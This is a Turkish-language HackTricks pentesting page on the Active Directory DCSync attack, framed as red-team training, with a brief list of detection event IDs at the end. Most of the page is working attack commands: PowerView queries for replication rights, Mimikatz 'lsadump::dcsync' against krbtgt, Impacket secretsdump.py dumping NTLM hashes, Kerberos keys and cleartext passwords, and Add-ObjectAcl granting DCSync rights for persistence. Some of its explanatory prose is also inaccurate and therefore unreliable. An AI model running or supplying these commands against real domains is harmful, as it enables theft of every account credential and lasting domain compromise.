# DCSync

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen iş akışlarını kolayca oluşturun ve otomatikleştirin.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek paylaşın.

</details>

## DCSync

**DCSync** izni, etki alanının kendisi üzerinde şu izinlere sahip olmayı ima eder: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** ve **Replicating Directory Changes In Filtered Set**.

**DCSync Hakkında Önemli Notlar:**

* **DCSync saldırısı, bir Etki Alanı Denetleyicisinin davranışını taklit eder ve diğer Etki Alanı Denetleyicilerinden bilgi replike etmelerini ister**. Bu işlem, Etki Alanı Denetleyicisi Hizmeti Uzak Protokolü (MS-DRSR) kullanılarak gerçekleştirilir. MS-DRSR, Active Directory'nin geçerli ve gereken bir işlevi olduğu için kapatılamaz veya devre dışı bırakılamaz.
* Varsayılan olarak, yalnızca **Domain Admins, Enterprise Admins, Administrators ve Domain Controllers** grupları gerekli ayrıcalıklara sahiptir.
* Eğer herhangi bir hesap şifresi tersine çevrilebilir şifreleme ile depolanıyorsa, Mimikatz'da şifrenin açık metin olarak döndürülmesi için bir seçenek bulunur.

### Sorgulama

Bu izinlere sahip olanları `powerview` kullanarak kontrol edin:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Yerel Olarak Sömürü Yapma

Bu yöntem, bir saldırganın hedef Active Directory (AD) ortamında yerel bir hesapla oturum açtıktan sonra DCSync saldırısını gerçekleştirmesini sağlar. DCSync saldırısı, bir saldırganın AD'deki bir kullanıcının NTLM hash'ini almasına ve bu hash'i kullanarak hedeflenen kullanıcının kimlik bilgilerini çekmesine olanak tanır.

DCSync saldırısını gerçekleştirmek için aşağıdaki adımları izleyebilirsiniz:

1. Saldırgan, hedef AD ortamında yerel bir hesapla oturum açar.
2. Saldırgan, mimikatz gibi bir araç kullanarak NTLM hash'lerini çekmek için "lsadump::dcsync" komutunu çalıştırır.
3. Saldırgan, hedeflenen kullanıcının NTLM hash'ini alır ve bu hash'i kullanarak hedeflenen kullanıcının kimlik bilgilerini elde eder.

Bu yöntem, saldırganın hedef AD ortamında yerel bir hesapla oturum açabilmesini gerektirir. Bu nedenle, saldırganın hedef sisteme fiziksel erişimi veya yerel bir hesapla oturum açma yetkisi olması gerekmektedir.
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Uzaktan Sömürü

DCSync, bir saldırganın etki alanı denetleyicisinden (Domain Controller) NTLM hashlerini çalmak için kullanılan bir saldırıdır. Bu saldırı, bir saldırganın etki alanı denetleyicisine erişimi olduğunda gerçekleştirilebilir. DCSync saldırısı, bir saldırganın etki alanı denetleyicisine bir istemci gibi davranmasını sağlar ve etki alanı denetleyicisinden kullanıcı hesaplarının NTLM hashlerini çekmesine olanak tanır.

Bu saldırıyı gerçekleştirmek için, saldırganın etki alanı denetleyicisine erişimi olan bir kullanıcı hesabına ihtiyacı vardır. Bu hesap, "Replicating Directory Changes" izinlerine sahip olmalıdır. Saldırgan, bu izinleri elde etmek için birçok farklı yöntem kullanabilir, örneğin bir yönetici hesabını ele geçirebilir veya bir hedef kullanıcının kimlik bilgilerini çalabilir.

DCSync saldırısını gerçekleştirmek için, saldırgan aşağıdaki adımları izler:

1. Saldırgan, etki alanı denetleyicisine erişimi olan bir kullanıcı hesabıyla oturum açar.
2. Saldırgan, etki alanı denetleyicisine bir istemci gibi davranır ve DRSUAPI protokolünü kullanarak etki alanı denetleyicisine bir DRSUAPI bağlantısı kurar.
3. Saldırgan, DRSUAPI bağlantısı üzerinden "IDL_DRSGetNCChanges" işlevini çağırarak etki alanı denetleyicisinden NTLM hashlerini çeker.
4. Saldırgan, çekilen NTLM hashlerini kullanarak saldırıya devam edebilir, örneğin bu hashleri kırarak kullanıcıların şifrelerini elde edebilir veya başka bir saldırıda kullanabilir.

DCSync saldırısı, bir saldırganın etki alanı denetleyicisine erişimi olduğunda oldukça etkili bir saldırıdır. Bu nedenle, etki alanı denetleyicilerinin güvenliğini sağlamak ve yetkisiz erişimi önlemek için gerekli önlemlerin alınması önemlidir.
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` 3 dosya oluşturur:

* **NTLM karmaşaları** ile bir dosya
* **Kerberos anahtarları** ile bir dosya
* **Tersine şifreleme** özelliği etkinleştirilmiş herhangi bir hesabın NTDS'den açık metin parolaları ile bir dosya. Tersine şifreleme özelliği etkinleştirilmiş kullanıcıları almak için aşağıdaki PowerShell komutunu kullanabilirsiniz:

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Süreklilik

Eğer bir etki alanı yöneticisiyseniz, `powerview` yardımıyla bu izinleri herhangi bir kullanıcıya verebilirsiniz:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Ardından, kullanıcının doğru şekilde atandığını kontrol edebilirsiniz. Bunları çıktıda arayarak (ayrıcalıkların adlarını "ObjectType" alanında görebilmelisiniz) kontrol edebilirsiniz:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Önlem

* Güvenlik Olay Kimliği 4662 (Nesne için denetim politikası etkin olmalıdır) - Bir nesne üzerinde bir işlem gerçekleştirildi.
* Güvenlik Olay Kimliği 5136 (Nesne için denetim politikası etkin olmalıdır) - Bir dizin hizmeti nesnesi değiştirildi.
* Güvenlik Olay Kimliği 4670 (Nesne için denetim politikası etkin olmalıdır) - Bir nesnenin izinleri değiştirildi.
* AD ACL Tarayıcı - ACL'lerin oluşturulması ve karşılaştırılması için raporlar oluşturur. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Referanslar

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek** paylaşın.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturmak ve otomatikleştirmek** için [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanın.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
